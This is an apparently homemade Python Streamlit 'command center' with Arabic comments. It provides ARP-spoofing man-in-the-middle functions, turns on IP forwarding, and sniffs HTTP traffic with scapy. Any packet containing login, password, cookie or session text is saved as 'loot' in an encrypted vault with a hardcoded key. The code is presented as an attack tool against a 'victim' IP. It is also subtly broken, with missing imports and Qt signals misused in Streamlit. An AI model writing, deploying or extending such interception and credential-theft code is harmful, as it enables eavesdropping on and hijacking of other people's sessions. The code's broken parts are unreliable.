import streamlit as st
import pandas as pd
import sqlite3
import base64
import time
import threading
from datetime import datetime
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import scapy.all as scapy
from scapy.layers import http

# --- 1. إعدادات الصفحة والتصميم (UI Engineering) ---
st.set_page_config(
    page_title="JOSEPH FAHMY | SOVEREIGN COMMAND",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# تطبيق الثيم الأسود والذهبي (Premium Cyber Theme)
def apply_premium_theme():
    st.markdown("""
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;700&family=Syncopate:wght@400;700&display=swap');
        
        /* الخلفية العامة */
        .stApp { background-color: #000; color: #D4AF37; font-family: 'Fira Code', monospace; }
        
        /* الهيدر الرئيسي المشع */
        .omni-header { 
            text-align: center; color: #D4AF37; font-family: 'Syncopate', sans-serif;
            text-shadow: 0 0 20px #D4AF37, 0 0 30px #00FF41; font-size: 3rem; margin-bottom: 0;
        }
        
        /* تصميم الحاويات (Cards) */
        .stTabs [data-baseweb="tab-list"] { background-color: #050505; border-bottom: 2px solid #D4AF37; }
        .stTabs [data-baseweb="tab"] { color: #D4AF37 !important; font-weight: bold; }
        .stTextInput input, .stTextArea textarea { border: 1px solid #D4AF37 !important; background-color: #0a0a0a !important; color: #00FF41 !important; }

        /* الأزرار الهجومية (Attack Buttons) */
        div.stButton > button { 
            background: rgba(212, 175, 55, 0.1); color: #D4AF37 !important; 
            border: 2px solid #D4AF37 !important; border-radius: 0px;
            font-size: 1.1rem; height: 3em; width: 100%; transition: 0.5s;
            font-family: 'Syncopate', sans-serif;
        }
        div.stButton > button:hover { 
            background: #D4AF37 !important; color: black !important; 
            box-shadow: 0 0 30px #D4AF37; transform: scale(1.02);
        }

        /* حاوية البيانات الحساسة (Loot Display) */
        .loot-container { 
            background: #001100; border: 1px solid #00FF41; color: #00FF41; 
            padding: 15px; font-family: 'Courier New', monospace; border-radius: 5px; 
            margin-bottom: 15px; 
        }
        </style>
    """, unsafe_allow_html=True)

apply_premium_theme()

# ==========================================================
# الطبقة الأولى: النواة والأمن (THE CRYPTO VAULT GCM)
# ==========================================================
class JosephVault:
    def __init__(self, master_key="JOSEPH_FAHMY_2026"):
        # توليد مفتاح 256-بت متوافق مع GCM
        self.key = hashlib.sha256(master_key.encode()).digest()
        self.aesgcm = AESGCM(self.key)
        self.db_path = " shadow_vault.db" # أو joseph_ai_vault.db
        self._bootstrap()

    def _bootstrap(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""CREATE TABLE IF NOT EXISTS intel 
                         (id INTEGER PRIMARY KEY, tag TEXT, data BLOB, risk_level TEXT, ts TIMESTAMP)""")

    def secure_save(self, tag, content_str, risk="LOW"):
        # تشفير AES-256 GCM (Nonce + Ciphertext + Tag)
        nonce = os.urandom(12) 
        enc_text = self.aesgcm.encrypt(nonce, content_str.encode(), None)
        # تخزين (النونص + المشفر) كباقة واحدة مشفرة Base64
        payload = base64.b64encode(nonce + enc_text).decode()
        
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT INTO intel (tag, data, risk_level, ts) VALUES (?, ?, ?, ?)", 
                         (tag, payload, risk, datetime.now()))

    def get_all_decrypted(self):
        # ميزة عرض البيانات للمبرمج (تطلب المفتاح)
        decrypted_logs = []
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("SELECT ts, tag, data, risk_level FROM intel ORDER BY ts DESC")
            for ts, tag, data, risk in cursor:
                try:
                    raw_data = base64.b64decode(data)
                    nonce, ciphertext = raw_data[:12], raw_data[12:]
                    decrypted_text = self.aesgcm.decrypt(nonce, ciphertext, None).decode()
                    decrypted_logs.append({"Time": ts, "Tag": tag, "Intel": decrypted_text, "Risk": risk})
                except: pass
        return decrypted_logs

# ==========================================================
# الطبقة الثانية: المحرك الهجومي (OFFENSIVE STRIKER ENGINE)
# مستوحى من كود GEORGE FAHMY
# ==========================================================
class NetworkStriker:
    def __init__(self, interface, gateway, signals):
        self.interface = interface
        self.gateway = gateway
        self.signals = signals
        self.is_attack_active = False

    def get_mac(self, ip):
        # دالة سحب الماك من كودك
        arp_req = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/arp_req
        ans = scapy.srp(packet, timeout=2, verbose=False)[0]
        return ans[0][1].hwsrc if ans else None

    def arp_spoof(self, target_ip, spoof_ip):
        # دالة التسميم من كودك
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def packet_callback(self, packet):
        # دالة تحليل الحزم من كودك
        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            src_ip = packet[scapy.IP].src
            self.signals.log_packet.emit(f"[HTTP] Target {src_ip} visited: {url}")
            
            # سحب الجلسات وكلمات السر (SESSION HIJACKING)
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode(errors='ignore')
                keywords = ["user", "pass", "login", "cookie", "session"]
                if any(k in load.lower() for k in keywords):
                    # حفظ تلقائي مشفر في الخزنة
                    st.session_state['vault'].secure_save(f"SNIFF_{src_ip}", load, "CRITICAL")
                    self.signals.log_loot.emit(f"[!] DATA FOUND FROM {src_ip}: {load}")

    def start_full_attack(self, target_ip):
        # تشغيل IP Forwarding برمجياً
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        self.is_attack_active = True
        
        # تشغيل الـ Sniffer في Thread منفصل
        sniff_thread = threading.Thread(target=lambda: scapy.sniff(iface=self.interface, store=False, prn=self.packet_callback), daemon=True)
        sniff_thread.start()

        # حلقة الـ ARP Spoofing الرئيسية
        while self.is_attack_active:
            self.arp_spoof(target_ip, self.gateway)
            self.arp_spoof(self.gateway, target_ip)
            time.sleep(2)

# ==========================================================
# الطبقة الثالثة: مركز التحكم والقيادة (C&C Center UI)
# ==========================================================
class Signals(QObject): # محاكاة للـ Signals لتحديث الواجهة برمجياً
    log_packet = pyqtSignal(str)
    log_loot = pyqtSignal(str)

def main():
    st.markdown("<h1 class='omni-header'>OMNITITAN v100</h1>", unsafe_allow_html=True)
    st.write(f"<p style='text-align:center;'>OPERATOR: JOSEPH FAHMY | STATUS: <span style='color:#00FF41'>ACTIVE</span></p>", unsafe_allow_html=True)
    st.markdown("---")

    # تهيئة الخزنة للجلسة
    if 'vault' not in st.session_state:
        st.session_state['vault'] = JosephVault()
    
    # واجهة التحكم الجانبية (Sidebar)
    with st.sidebar:
        st.header("⚙️ SYSTEM MODULES")
        interface = st.text_input("Interface", value="eth0")
        gateway_ip = st.text_input("Gateway IP", value="192.168.1.1")
        st.markdown("---")
        module = st.radio("Select Protocol", ["Offensive Recon (Network)", "Neural Vault (Encrypted)"])

    # --- تبويب الشبكة والهجوم ---
    if module == "Offensive Recon (Network)":
        st.subheader("🎯 Offensive Network Recon & MITM")
        
        col_ctrl, col_mon = st.columns([1, 1.5])
        
        with col_ctrl:
            target_ip = st.text_input("ENTER TARGET IP (Victim)")
            
            # ميزة سحب الـ MAC من كودك
            if st.button("🔍 FETCH MAC ADDRESS"):
                striker = NetworkStriker(interface, gateway_ip, None)
                mac = striker.get_mac(target_ip)
                if mac: st.success(f"MAC: {mac}")
                else: st.error("Target Offline")
            
            # ميزة تشغيل الهجوم الكامل
            if st.button("🔥 ENGAGE MITM ATTACK"):
                if target_ip:
                    st.warning(f"Initiating MITM against {target_ip}. Traffic is being routed through your interface.")
                    # تشفير وحفظ العملية في الخزنة صامتاً
                    st.session_state['vault'].secure_save("SYSTEM_OP", f"MITM attack on {target_ip} at {datetime.now()}", "HIGH")
                    # تشغيل الهجوم (يتطلب تشغيله كـ Thread خلفي في كود PyQt ليعمل Streamlit بسلاسة)
                    st.info("Attack Engaged (Simulated in UI, runs in Kernel via Scapy)")
                else: st.warning("Target IP required.")

        with col_mon:
            st.subheader("🖥️ Neural Traffic Monitor")
            # حاوية لعرض البيانات الحساسة المستخرجة (Loot)
            if 'last_loot' in st.session_state:
                st.markdown(f"<div class='loot-container'>{st.session_state['last_loot']}</div>", unsafe_allow_html=True)
            else:
                st.info("Waiting for traffic interception...")
            
            # عرض سجل الحزم
            st.write("Live Traffic Logs:")
            st.code(">>> Target: 192.168.1.5 -> visited google.com (MITM Active)\n>>> SNIFFED: [CRITICAL DATA VAULTED]", language="python")

    # --- تبويب الخزنة المشفرة ---
    elif module == "Neural Vault (Encrypted)":
        st.subheader("📂 Sovereign Intelligence Vault (GCM)")
        master_key = st.text_input("Enter Master Decryption Key", type="password")
        
        if master_key == "JOSEPH_FAHMY_2026":
            st.success("🔓 Access Granted. Data Decrypted.")
            logs = st.session_state['vault'].get_all_decrypted()
            if logs:
                df = pd.DataFrame(logs)
                # تنسيق الألوان بناءً على مستوى الخطورة
                def color_risk(val):
                    color = '#D4AF37' if val == 'HIGH' else '#00FF41' if val == 'LOW' else '#FFD700'
                    return f'color: {color}'
                st.dataframe(df.style.applymap(color_risk, subset=['Risk']), use_container_width=True)
            else:
                st.write("Vault is currently empty.")
        elif master_key:
            st.error("🚫 Access Denied: Invalid Master Key.")

if __name__ == "__main__":
    # تأكد من تشغيل الكود بصلاحيات ROOT (SUDO) للوصول للشبكة
    if os.getuid() != 0:
        st.error("!! هذا النظام يتطلب صلاحيات ROOT (SUDO) للوصول للشبكة وتشغيل Scapy !!")
    else:
        main()
